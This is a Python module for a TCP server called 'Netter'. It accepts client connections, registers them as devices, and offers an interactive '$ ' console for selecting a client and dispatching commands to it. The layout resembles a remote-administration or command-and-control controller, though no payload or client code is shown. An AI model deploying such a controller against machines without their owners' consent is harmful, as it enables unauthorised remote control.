import socket, loguru, os
from .device import ClientDevice, ClientWrapper
from .bucket import ConnectionBucket
from .handler import ClientHandler

class NetterServer(socket.socket):
    def __init__(self, connectionBucket: ConnectionBucket, _bind_address: tuple[str, int], _backlog: int = 10) -> None:
        super().__init__(socket.AF_INET, socket.SOCK_STREAM)
        super().bind(_bind_address); super().listen(_backlog)

        self.connectionBucket: ConnectionBucket = connectionBucket
        self._selectedClient: ClientDevice | None = None
        self._waitingForResponse: bool = False
        self.isRunning: bool = True

    def controller(self) -> None:
        while True:
            input_prompt: str = '$ ' if not self._selectedClient else f'{self._selectedClient.clientUniqueID} $ '
            command: str = input(input_prompt)

            if (command):

                if (command in ['exit', 'quit']):
                    if (not self._selectedClient):
                        for client in self.connectionBucket.connectionList:
                            client.socket.connection.close()

                        loguru.logger.info('Exitting server..')
                        self.isRunning = False
                        self.close()

                        break

                    self._selectedClient = None
                    continue

                self.connectionBucket.handle_command(command)

        os._exit(0)

    def accept(self) -> ClientDevice | bool:
        connection, connectionAddress = super().accept()
        Client: ClientWrapper = ClientWrapper(connection, connectionAddress)

        if ((device := ClientDevice('', '', '', '')).load_data(
                client_data = Client.receive_packet(),
                connectionBucket = self.connectionBucket,
                socketInstance = Client
            )
        ):

            ClientHandler(device, connectionAddress = connectionAddress, connectionBucket = self.connectionBucket, NetterInstance = self).start()
            return device

        return False